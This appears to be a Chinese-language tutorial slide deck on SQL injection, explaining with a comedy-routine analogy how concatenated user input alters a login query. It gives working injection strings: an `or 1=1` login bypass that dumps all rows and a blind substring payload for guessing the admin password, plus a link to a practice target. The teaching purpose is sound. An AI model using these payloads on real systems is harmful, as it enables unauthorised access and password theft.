
# SQL Injection

---

## 這啥

--

一種故意塞奇怪的內容讓別人的程式講錯話的手法

---

✋🌰

--

有聽過**棒球隊棒球隊**這個相聲橋段嘛

--

- 誰在一壘
- 什麼在二壘
- 三壘我不知道

--

當某些常用有特殊意義的字詞

混進句子裡的時候會造成的誤解

--

尤其是當你直接把別人給的資料

無條件加進 SQL query 的時候

---

好比說你要登入

你輸入了 帳號: admin 密碼: meow

假設拼出來的 SQL 指令長這樣

```sql
SELECT * from Users
  where user = 'admin' and password = md5('meow');
```

--

密碼不對啥都沒有

![](https://i.imgur.com/WOeMBJM.png)

---

字串是用單引號包的呢

那在參數裡加個 `'` 好了

帳號: `admin'` 密碼: meow

```sql
SELECT * from Users
  where user = 'admin'' and password = md5('meow');
```

--

上色爆炸啦

這行拿去跑會噴錯誤

![](https://i.imgur.com/nIMeDb6.png)

---

那如果說我們故意把他湊成有意義的呢

--

帳號: `admin' or 1=1#'` 密碼: meow

```sql
SELECT * from Users
  where user = 'admin' or 1=1#'' and password = md5('meow');
```

> 上面那個是語法 highlight 的問題 `#` 後面應該會是註解色

--

OOPS

![](https://i.imgur.com/QT9mOZK.png)

--

這是最基本的邏輯注入

讓他倒出全部的資料

然後也因為有選出東西，所以就可以跳過登入了

--

[試打看看](http://140.134.208.86:13001)

---

---

---

或者可以偷看某個東西對不對

像是你只知道成不成功的時候

--

而 SQL 是允許把一個 query 的結果當成另一個 query 或是函式的參數



--

帳號: `admin' or substring((select password from Users where user = 'admin' limit 1),1,1)='a'#'`

密碼: meow

```sql
SELECT * from Users
  where user = 'admin' or substring((select password from Users where user = 'admin' limit 1),1,1)='a'--' and password = md5('meow');
```

--

如果過了

代表 `admin` 的 `password` 那一欄

第一個字元是 `a` 或 `A`

> 雖然很顯然不是 (看上一個)

---
